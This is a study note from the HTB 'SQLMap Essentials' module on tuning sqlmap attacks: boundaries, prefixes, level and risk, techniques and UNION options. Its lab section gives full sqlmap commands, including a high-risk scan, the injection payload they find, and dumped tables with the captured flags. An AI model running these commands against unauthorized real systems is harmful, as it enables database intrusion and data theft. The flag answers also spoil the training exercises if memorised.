---
tags: [CWES, HTB, technical-reference]
module: "SQLMap Essentials"
source_file: "CWES.xmind"
---

# Attack Tuning

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## vector

### (e.g., UNION ALL SELECT 1,2,VERSION()): central part of the payload, carrying the useful SQL code to be executed at the target.

## boundaries

### (e.g. '<vector>-- -): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.

## custom Prefix/Suffix

### By default, SQLMap combines a predefined set of most common boundaries

### sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"

## Level/Risk

### --level (1-5, default 1)

- extends both vectors and boundaries being used
### --risk (1-3, default 1)

- extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).
### check for differences between used boundaries and payloads

- -v option to set the verbosity level. In verbosity 3 or higher
  - sqlmap -u www.example.com/?id=1 -v 3 --level=5
### --level=1 --risk=1

- payloads used for testing a single parameter goes up to 72
### --level=5 --risk=3

- number of payloads increases to 7,865.
### OR payloads is a must (e.g., in case of login pages)

- we may have to raise the risk level ourselves.
## Advanced Tuning

### Status Codes

- detection of TRUE responses to a specific HTTP code (e.g. --code=200).
### Titles

- --titles
### Strings

- --string=success
### Text-only

- --text-only
### Techniques

- skip the time-based blind and stacking SQLi
  - --technique=BEU
    - Technique	Meaning	Type  
      B	Boolean-based blind	Blind  
      E	Error-based	Visible output  
      U	UNION query	Visible output  
      S	Stacked queries	Executes multiple queries (;)  
      T	Time-based blind	Blind  
      Q	Inline queries	DB-specific inline syntax
### UNION SQLi Tuning

- If we can manually find the exact number of columns
  - --union-cols=17
- filling values
  - In case that the default "dummy" filling values used by SQLMap -NULL and random integer- are not compatible
    - --union-char='a'
- appendix at the end of a UNION query in the form of the FROM <table> (e.g., in case of Oracle)
  - --union-from=users
## LAB

### What's the contents of table flag5? (Case #5)

- id =1 returned user value (from DB)
  - sqlmap -u "http://94.237.50.128:48668/case5.php?id=1" -p id --batch -v 3 --level=5 --risk=3 --technique=BUE
    - Payload: id=-9574 OR 9337=9337
      - sqlmap -u "http://94.237.50.128:48668/case5.php?id=1" -p id --batch --dbs
        - got } only
          - fix the caching issue
            - sqlmap -u "http://94.237.50.128:48668/case5.php?id=1" -p id --batch -v 3 --level=5 --risk=3 --technique=BUE --dbs --fresh-queries --flush-session
              - testdb
        - sqlmap -u "http://94.237.50.128:48668/case5.php?id=1" -D testdb -T flag5 --dump --no-cast
          - +----+---------------------------------+  
            | id | content                         |  
            +----+---------------------------------+  
            | @a | HTB{700_much_r15k_bu7_w0r7h_17} |  
            +----+---------------------------------+
### What's the contents of table flag6? (Case #6)

- sqlmap -u 'http://94.237.50.128:48668/case6.php?col=id' --batch -p col --level=5 --risk=3 -v 3 --technique=BUE --prefix='`)'
  - sqlmap -u 'http://94.237.50.128:48668/case6.php?col=id' --batch -D testdb -T flag6 --dump
    - HTB{v1nc3_mcm4h0n_15_4570n15h3d}
### What's the contents of table flag7? (Case #7)

- id	name	birthday	 occupation	phone  
  1	Maynard Rice	March 1 1958	Linemen	281-559-0172
  - sqlmap -u 'http://94.237.50.128:48668/case7.php?id=1' -p id --batch --level=5 --risk=3 --technique=U -v 3 --union-cols=5
    - sqlmap -u 'http://94.237.50.128:48668/case7.php?id=1' --batch -D testdb -T flag7 --dump
      - HTB{un173_7h3_un173d}
